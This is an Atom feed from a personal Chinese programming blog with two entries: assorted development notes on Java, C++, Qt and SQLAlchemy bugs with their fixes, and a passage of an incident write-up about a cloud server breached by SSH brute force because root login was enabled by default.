<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Joe1sn&#39;s Cabin</title>
  
  
  <link href="https://joe1sn.eu.org/atom.xml" rel="self"/>
  
  <link href="https://joe1sn.eu.org/"/>
  <updated>2025-11-04T01:57:27.500Z</updated>
  <id>https://joe1sn.eu.org/</id>
  
  <author>
    <name>Joe1sn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【置顶】【编程】开发笔记</title>
    <link href="https://joe1sn.eu.org/2098/12/31/develop_handbook/"/>
    <id>https://joe1sn.eu.org/2098/12/31/develop_handbook/</id>
    <published>2098-12-31T13:06:45.000Z</published>
    <updated>2025-11-04T01:57:27.500Z</updated>
    
    <content type="html"><![CDATA[<p>日常开发遇到的一些坑，记录一下挺有意思的</p><span id="more"></span><h1 id="多态的概念"><a class="markdownIt-Anchor" href="#多态的概念"></a> 多态的概念</h1><p>和继承不同的是，他是根据“动作”的不同进行的分类。</p><p>在c<ins>中想要有一个数组存放既有<code>int</code>类型又有<code>string</code>类型，类似python中的<code>&#123;123, &quot;AAA&quot;, &quot;BBB&quot;, 456&#125;</code>，但是c</ins>数组中只能存在一个类型，所以不可能。</p><p>但是我们可以定义一个<code>type</code>类型，<code>int</code>和<code>string</code>是他的子类，由多态的概念，可以创建一个 <code>type* a[0x10]</code>这样的数组，将<code>int</code>和<code>string</code>类型放在里面，其中需要的是<strong>父类引用</strong>。<s>虽然在c++中我们可以直接传入对象的地址到数组中即可</s>。</p><p>多态允许我们使用统一的接口来操作不同的对象，而具体执行哪个操作，则由对象自身的实际类型来决定。</p><p><strong>多态存在的三个必要条件</strong></p><ol><li><strong>继承</strong>：必须存在继承关系。</li><li><strong>重写</strong>：子类必须对父类的方法进行重写（Override）。</li><li><strong>父类引用指向子类对象</strong>：这是实现多态的关键代码形式。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父类：动物</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在吃东西。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;动物发出声音。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类：狗，继承自动物</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123; <span class="comment">// “Dog is an Animal”</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name); <span class="comment">// 调用父类构造器</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写父类方法，以实现特定行为</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;汪汪叫！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 扩展新功能</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fetch</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;在接飞盘。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类：猫，继承自动物</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123; <span class="comment">// “Cat is an Animal”</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Cat</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写父类方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;喵喵叫！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 多态的经典体现：父类引用指向子类对象</span></span><br><span class="line">        <span class="type">Animal</span> <span class="variable">myDog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;旺财&quot;</span>); <span class="comment">// Animal 引用指向 Dog 对象</span></span><br><span class="line">        <span class="type">Animal</span> <span class="variable">myCat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;咪咪&quot;</span>); <span class="comment">// Animal 引用指向 Cat 对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用重写的方法</span></span><br><span class="line">        myDog.makeSound(); <span class="comment">// 输出：旺财汪汪叫！</span></span><br><span class="line">        myCat.makeSound(); <span class="comment">// 输出：咪咪喵喵叫！</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用未重写的方法</span></span><br><span class="line">        myDog.eat(); <span class="comment">// 输出：旺财正在吃东西。</span></span><br><span class="line">        myCat.eat(); <span class="comment">// 输出：咪咪正在吃东西。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 多态的优势：编写通用代码</span></span><br><span class="line">        Animal[] animals = &#123;<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;小黑&quot;</span>), <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;小白&quot;</span>)&#125;;</span><br><span class="line">        animalConcert(animals);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一个通用的方法，接收父类类型参数，可以处理任何子类对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">animalConcert</span><span class="params">(Animal[] animals)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Animal animal : animals) &#123;</span><br><span class="line">            animal.makeSound(); <span class="comment">// 这里不需要知道具体是Dog还是Cat，它们会自己“叫”</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">旺财汪汪叫！</span><br><span class="line">咪咪喵喵叫！</span><br><span class="line">旺财正在吃东西。</span><br><span class="line">咪咪正在吃东西。</span><br><span class="line">小黑汪汪叫！</span><br><span class="line">小白喵喵叫！</span><br></pre></td></tr></table></figure><h1 id="power-toys键盘映射失效"><a class="markdownIt-Anchor" href="#power-toys键盘映射失效"></a> power toys键盘映射失效</h1><p>vscode使用管理员权限运行时使用的是映射之前的输入</p><p>普通模式下使用的时映射后的输入</p><p>目前还没找大解决方法</p><h1 id="python-sqlalchemy-查询结果扩大化"><a class="markdownIt-Anchor" href="#python-sqlalchemy-查询结果扩大化"></a> python sqlalchemy 查询结果扩大化</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_self_info</span>(<span class="params">uuid: <span class="built_in">str</span></span>):</span><br><span class="line">    tasks = session.query(SelfInfo).<span class="built_in">filter</span>(uuid == uuid).<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> tasks</span><br></pre></td></tr></table></figure><p>很明显的typo错误，<code>uuid == uuid</code>是恒成立的，所以会返回所有的结果，导致某个用户获得全部的结果</p><p>应当改为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_self_info</span>(<span class="params">need_uuid: <span class="built_in">str</span></span>):</span><br><span class="line">    tasks = session.query(SelfInfo).<span class="built_in">filter</span>(SelfInfo.uuid == need_uuid).<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> tasks</span><br></pre></td></tr></table></figure><p>甚至</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_self_info</span>(<span class="params">uuid: <span class="built_in">str</span></span>):</span><br><span class="line">    tasks = session.query(SelfInfo).<span class="built_in">filter</span>(SelfInfo.uuid == uuid).<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> tasks</span><br></pre></td></tr></table></figure><h1 id="c-qt6-emit-时undefine"><a class="markdownIt-Anchor" href="#c-qt6-emit-时undefine"></a> c++ Qt6 emit 时undefine</h1><p>原因是类中没有添加QT的宏定义<code>Q_OBJECT</code>，正常应该如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BeaconTable</span> :<span class="keyword">public</span> BasicTable&lt;TargetInfo&gt;</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">doA</span><span class="params">(<span class="type">int</span> Id)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">doB</span><span class="params">(<span class="type">int</span> Id)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>抽象类中不能使用该宏定义</p><h1 id="c-抽象类"><a class="markdownIt-Anchor" href="#c-抽象类"></a> c++ 抽象类</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Table</span> :</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure><p>在cpp中要</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="type">void</span> Table&lt;T&gt;::<span class="built_in">deleteRow</span>(<span class="type">int</span> row)&#123;&#125;</span><br></pre></td></tr></table></figure><p>并且明确具体的抽象类</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> <span class="keyword">class</span> <span class="title class_">Table</span>&lt;<span class="type">int</span>&gt;;</span><br><span class="line"><span class="keyword">template</span> <span class="keyword">class</span> <span class="title class_">Table</span>&lt;<span class="type">char</span>*&gt;;</span><br></pre></td></tr></table></figure><h1 id="python-asynciostreamreader-read不完全"><a class="markdownIt-Anchor" href="#python-asynciostreamreader-read不完全"></a> python-asyncio.StreamReader read不完全</h1><p>比如期待 <code>data=read(n)</code>但是<code>len(data) &lt; n</code>是因为缓冲区大小或者去处理其他的read导致一次<code>await read</code>无法读取完毕，但是可以利用循环分块读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(data) &lt; file_len:</span><br><span class="line">    chunk = <span class="keyword">await</span> reader.read(file_len - <span class="built_in">len</span>(data))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    data += chunk</span><br></pre></td></tr></table></figure><h1 id="python-sqlalchemy偶尔出现-tuple-index-out-of-range"><a class="markdownIt-Anchor" href="#python-sqlalchemy偶尔出现-tuple-index-out-of-range"></a> python-sqlalchemy偶尔出现 tuple Index out of range</h1><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/7b835aba816d169237c705380616a11c.png" alt="7b835aba816d169237c705380616a11c" /></p><p>model如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Sessions</span>(<span class="title class_ inherited__">Base</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Session used in cookie&#x27;&#x27;&#x27;</span></span><br><span class="line">    __tablename__ = <span class="string">&#x27;sessions&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = Column(Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)      <span class="comment"># PK</span></span><br><span class="line">    created_at = Column(Integer, default=<span class="keyword">lambda</span>: <span class="built_in">int</span>(time.time()), nullable=<span class="literal">False</span>)</span><br><span class="line">    username = Column(String(<span class="number">32</span>), nullable=<span class="literal">False</span>)</span><br><span class="line">    token = Column(String(<span class="number">64</span>), nullable=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>查询controller如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>(<span class="params">stoken: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">from</span> db <span class="keyword">import</span> session</span><br><span class="line">    exists = session.query(</span><br><span class="line">        Sessions.<span class="built_in">id</span>)</span><br><span class="line">        .<span class="built_in">filter</span>(Sessions.token == stoken)</span><br><span class="line">        .<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(exists&gt;=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>可能有其他错误，<strong>并且只是偶尔发生</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/e91dcee379e16cbd36012b44b2fbe4ec.png" alt="e91dcee379e16cbd36012b44b2fbe4ec" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/78a83b20272bd1dc0f27f145e34ef970.png" alt="78a83b20272bd1dc0f27f145e34ef970" /></p><p>原因：DBAPI中的并发问题，一个连接不能同时处理大量信息</p><p>解决：在这个controller中新建一个连接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ConnDB</span>:</span><br><span class="line">    <span class="comment">#...</span></span><br><span class="line">        self.__engine = create_engine(</span><br><span class="line">        <span class="string">&#x27;sqlite:///&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.__path),     </span><br><span class="line">        connect_args=&#123;<span class="string">&quot;check_same_thread&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                        <span class="string">&quot;timeout&quot;</span>: <span class="number">30</span>,              <span class="comment"># 设置超时</span></span><br><span class="line">                        <span class="string">&quot;isolation_level&quot;</span>: <span class="string">&quot;IMMEDIATE&quot;</span>&#125;,  <span class="comment"># 更好的并发控制</span></span><br><span class="line">        pool_pre_ping=<span class="literal">True</span>,</span><br><span class="line">        echo=<span class="literal">False</span>)</span><br><span class="line">    self.__session = sessionmaker(bind=self.__engine, autocommit=<span class="literal">False</span>, autoflush=<span class="literal">False</span>,)</span><br><span class="line">    <span class="comment">#...</span></span><br><span class="line"></span><br><span class="line">Session = conn_db.get_session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>(<span class="params">stoken: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    db = Session()</span><br><span class="line">    exists = db.query(</span><br><span class="line">        db.query(Sessions.<span class="built_in">id</span>)</span><br><span class="line">        .<span class="built_in">filter</span>(Sessions.token == stoken)</span><br><span class="line">        .exists()</span><br><span class="line">    ).scalar()</span><br><span class="line">    db.close()</span><br><span class="line">    <span class="keyword">return</span> exists</span><br></pre></td></tr></table></figure><h1 id="vscode鼠标拖动代码页分栏失效没反应"><a class="markdownIt-Anchor" href="#vscode鼠标拖动代码页分栏失效没反应"></a> vscode鼠标拖动代码页分栏失效/没反应</h1><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250310214956036.png" alt="img" /></p><p>环境：windows</p><p>解决方法：cmd+shift+p 运行两次 Developer: Toggle Screencast Mode</p><h1 id="if-else与i-i"><a class="markdownIt-Anchor" href="#if-else与i-i"></a> if-else与++i --i</h1><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250310214545430.png" alt="img" /></p><p>写<code>if</code>最好先把<code>else</code>也写上，<code>i++</code>是语句结束后<code>i+1</code>，<code>++i</code>是立即加</p><h1 id="左值与右值"><a class="markdownIt-Anchor" href="#左值与右值"></a> 左值与右值</h1><p>左值：表达式左边的值，可以被查找到地址的、持久存在的值</p><p>右值：字面量，或者<code>std::move</code>后的左值</p><p>左值引用：就是变量的别名</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250310214208905.png" alt="image-20250310214208773" /></p><p>右值引用：绑定到临时、即将销毁的对象，使用方法<code>int &amp;&amp;right</code>。意义就是避免内存操作</p><h1 id="构造函数"><a class="markdownIt-Anchor" href="#构造函数"></a> 构造函数</h1><p>构造函数就是一个类初始化的时候所需要的函数，主要分为以下几类</p><ul><li>默认构造函数</li><li>带参数的构造函数</li><li>拷贝构造函数：可以实现对象的深拷贝和浅拷贝，<strong>省略<code>&amp;</code>会导致无限递归</strong></li><li>移动构造函数：接受一个右值引用（<code>std::move</code>）</li><li>转换构造函数</li><li>委托构造函数</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"></span><br><span class="line"><span class="comment">//默认构造函数</span></span><br><span class="line"><span class="built_in">Base</span>():<span class="built_in">val</span>(<span class="built_in">int</span>(<span class="number">0</span>)) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;默认构造函数. value is &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;val &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//带参数的构造函数</span></span><br><span class="line"><span class="built_in">Base</span>(<span class="type">int</span> v):<span class="built_in">val</span>(v) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;带参数的构造函数. value is &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;val &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//拷贝构造函数</span></span><br><span class="line"><span class="built_in">Base</span>(<span class="type">const</span> Base&amp; other): <span class="built_in">val</span>(other.val) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;拷贝构造函数. value is &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;val &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//移动构造函数</span></span><br><span class="line"><span class="built_in">Base</span>(Base&amp;&amp; other) <span class="keyword">noexcept</span>: <span class="built_in">val</span>(other.val) &#123;</span><br><span class="line">other.val = <span class="number">0xFF</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;移动构造函数. value is &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;val &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//转换构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">Base</span><span class="params">(<span class="type">double</span> v)</span>: val(static_cast&lt;int&gt;(v)) &#123;</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;转换构造函数. value is &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;val &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//委托构造函数</span></span><br><span class="line"><span class="built_in">Base</span>(<span class="type">char</span> v) : <span class="built_in">Base</span>() &#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;val = v;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;委托构造函数. value is &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;val &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">~<span class="built_in">Base</span>() &#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Base a;<span class="comment">//默认</span></span><br><span class="line"><span class="function">Base <span class="title">b</span><span class="params">(<span class="number">1</span>)</span></span>;<span class="comment">//带参数</span></span><br><span class="line"><span class="function">Base <span class="title">c</span><span class="params">(b)</span></span>;<span class="comment">//拷贝</span></span><br><span class="line"><span class="function">Base <span class="title">d</span><span class="params">(std::move(b))</span></span>;<span class="comment">//移动</span></span><br><span class="line"><span class="function">Base <span class="title">e</span><span class="params">(<span class="number">3.124</span>)</span></span>;<span class="comment">//转换</span></span><br><span class="line"><span class="function">Base <span class="title">f</span><span class="params">(<span class="string">&#x27;A&#x27;</span>)</span></span>;<span class="comment">//委托</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250310213436073.png" alt="image-20250310213435929" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常开发遇到的一些坑，记录一下挺有意思的&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="c" scheme="https://joe1sn.eu.org/tags/c/"/>
    
    <category term="python" scheme="https://joe1sn.eu.org/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>【实战】很坏很坏的默认配置策略</title>
    <link href="https://joe1sn.eu.org/2025/11/14/bad-cloud-Strategy/"/>
    <id>https://joe1sn.eu.org/2025/11/14/bad-cloud-Strategy/</id>
    <published>2025-11-14T08:56:57.000Z</published>
    <updated>2025-11-14T09:02:22.018Z</updated>
    
    <content type="html"><![CDATA[<p>腾讯云默认云服务器SSH配置引发的“血案”</p><span id="more"></span><p>长话短说就是博主以为腾讯云默认root不能ssh登录，所以就设置了简单的密码，因为博主旧云服务器就是这样的（话说大多数Linux默认都是这样的吧，我还记得以前开kali的ssh得修改配置让root登录），之后自然而然地就被干了。</p><h1 id="起因"><a class="markdownIt-Anchor" href="#起因"></a> 起因</h1><p>腾讯云告警</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads2ef3caab42c2b08051b0d59803d590d6.png" alt="2ef3caab42c2b08051b0d59803d590d6" /></p><p><code>top/htop</code>发现不常见软件，这里截图丢了一张</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20251114154953107.png" alt="image-20251114154953107" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20251114155009253.png" alt="image-20251114155009253" /></p><h1 id="时间线"><a class="markdownIt-Anchor" href="#时间线"></a> 时间线</h1><p>11-14 15: 30 腾讯云告警</p><p>11-14 12:52 恶意文件写入</p><p>11-13 购买云服务器</p><h1 id="日志审计"><a class="markdownIt-Anchor" href="#日志审计"></a> 日志审计</h1><h2 id="ssh"><a class="markdownIt-Anchor" href="#ssh"></a> SSH</h2><p>按照时间线</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20251114155956724.png" alt="image-20251114155956724" /></p><p>攻击从<code>2025-11-14T12:46:58.464021+08:00</code>进行ssh爆破</p><p>攻击者IP：<code>142.93.111.208</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20251114160137307.png" alt="image-20251114160137307" /></p><p>从root用户登陆进入的？？？我记得旧服务器里面root用户不能远程登陆，这里应该也不能吧</p><p>不管了，先修改密码</p><p><strong>然后我尝试使用root登录，发现登录成功？？？</strong></p><p>看看配置：<code>sudo vi /etc/ssh/sshd_config</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20251114161206765.png" alt="image-20251114161206765" /></p><p><strong>？？？腾讯云允许root用户远程登陆是开启的</strong></p><p>设置为no然后重启</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20251114161458785.png" alt="image-20251114161458785" /></p><p>顺着这个漏洞发现存在多条被爆破成功的日志</p><p><img src="D:%5CHacktools%5CActions%5CplayCT%5Cassets%5Cimage-20251114162340839.png" alt="image-20251114162340839" 